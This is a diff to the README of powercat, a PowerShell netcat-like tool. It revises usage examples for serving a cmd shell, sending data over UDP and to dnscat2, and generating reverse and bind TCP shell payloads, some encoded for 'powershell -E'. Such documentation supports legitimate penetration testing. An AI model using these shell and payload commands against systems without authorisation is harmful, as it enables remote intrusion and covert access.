@@ -53,7 +53,7 @@ powercat can be used to transfer files back and forth using -i (Input) and -of (
 
 Shells
 ------
-powercat can be used to send and server shells. Specify an executable to -e, or use -ep to execute powershell.
+powercat can be used to send and serve shells. Specify an executable to -e, or use -ep to execute powershell.
 ###
     Serve a cmd Shell:
         powercat -l -p 443 -e cmd
@@ -64,7 +64,7 @@ powercat can be used to send and server shells. Specify an executable to -e, or 
 
 DNS and UDP
 -----------
-powercat supports more than sending data over TCP. Specify -u to enable UDP Mode. Data can also be sent to a dnscat2 server with -dns.
+powercat supports more than sending data over TCP. Specify -u to enable UDP Mode. Data can also be sent to a [dnscat2 server](https://github.com/iagox86/dnscat2) with -dns.
 ###
     Send Data Over UDP:
         powercat -c 10.1.1.1 -p 8000 -u
@@ -85,12 +85,12 @@ Relays in powercat work just like traditional netcat relays, but you don't have 
 
 Generate Payloads
 -----------------
-Payloads which do a specific action can be generated using -g (Generate Payload) and -ge (Generate Encoded Payload). You can use these if you don't want to use all of powercat.
+Payloads which do a specific action can be generated using -g (Generate Payload) and -ge (Generate Encoded Payload). Encoded payloads can be executed with powershell -E. You can use these if you don't want to use all of powercat.
 ###
-    Generate a reverse tcp shell script which connects back to 10.1.1.15 port 443:
-        powercat -c 10.1.1.15 -p 443 -g
-    Generate a bind tcp shell encoded command which listens on port 8000:
-        powercat -l -p 8000 -ge
+    Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
+        powercat -c 10.1.1.15 -p 443 -e cmd -g
+    Generate a bind tcp encoded command which listens on port 8000:
+        powercat -l -p 8000 -e cmd -ge
 
 Misc Usage
 ----------
